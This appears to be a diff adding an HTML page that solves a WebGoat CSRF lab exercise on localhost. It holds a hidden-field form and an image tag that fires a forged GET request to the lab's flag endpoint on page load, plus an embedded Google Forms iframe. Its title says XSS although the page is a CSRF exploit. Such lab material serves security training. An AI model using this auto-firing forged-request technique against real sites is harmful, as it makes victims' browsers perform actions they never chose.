@@ -1,0 +1,12 @@
+<html>
+<head>Basic XSS</head>
+<body>
+<form accept-charset="UNKNOWN" id="basic-csrf-get" method="GET" name="form1" successcallback=""
+action="http://localhost:8080/WebGoat/csrf/basic-get-flag?csrf=false&ubmit%3D=Submit" enctype="application/json;charset=UTF-8">
+<input name="csrf" type="hidden" value="false">
+<input type="submit" name="ubmit=">
+</form>
+<img src="http://localhost:8080/WebGoat/csrf/basic-get-flag?csrf=false&ubmit%3D=Submit">
+<iframe src="https://docs.google.com/forms/d/e/1FAIpQLScKfREJk7shK6mk8Itg01l6cdhW_Ku11GLQYVBUeCDWmHwMig/viewform" width="700" height="520" frameborder="0" marginheight="0" marginwidth="0">Loading...</iframe>
+</body>
+</html>
